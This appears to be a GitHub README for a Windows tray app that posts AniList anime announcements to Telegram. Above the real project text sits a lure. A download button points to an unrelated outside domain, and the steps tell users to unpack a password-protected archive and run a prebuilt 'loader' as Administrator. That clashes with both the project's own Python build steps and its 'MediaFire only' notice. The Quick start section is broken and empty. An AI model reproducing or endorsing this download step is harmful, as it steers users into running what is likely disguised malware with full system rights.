<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Features

- Polls the public AniList GraphQL API at a configurable interval
- Sends Telegram messages with cover, format, season, genres and an "Open on AniList" button
- Whitelist: the bot ignores everyone except the Telegram user IDs you allow
- Bot commands: `/start`, `/status`, `/check` (manual check)
- Tray menu: check now, start with Windows, exit
- The first run only records existing titles, so you are not flooded with old announcements

## Requirements

- Windows 10/11
- Python 3.10+
## Quick start

```bash
## Testing

1. Start the app and send `/start` and `/status` to your bot from a whitelisted account. You should get replies; other accounts get no response at all.
2. Send `/check` or use **Check for updates now** in the tray menu to trigger a check manually.
3. To see a real notification, close the app, remove a few IDs from `sent_ids` in `cache.json`, start the app again and run `/check`. Those titles will be sent again.
4. Toggle **Start with Windows** in the tray menu and check that the autostart entry appears (and disappears) as expected.
5. If something goes wrong, check the console output (when run via `python main.py`) or `bot.log` (in the built `.exe` version).

## Building the .exe

```bash
pip install pyinstaller
pyinstaller --onefile --windowed --name AniListMonitorBot --icon=icon.ico --add-data "icon.ico;." main.py
```

The executable is created in `dist/`. Place your `.env` file (and optionally `icon.ico`) next to `AniListMonitorBot.exe` and run it. Logs are written to `bot.log` because the windowed build has no console.

If you don't have an `icon.ico`, drop the `--icon` and `--add-data` options; the app falls back to a generated icon.

## Note

- Windows only (system tray, autostart, PyInstaller build).


---

MIT License

Copyright (c) 2026 Black Pencil

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
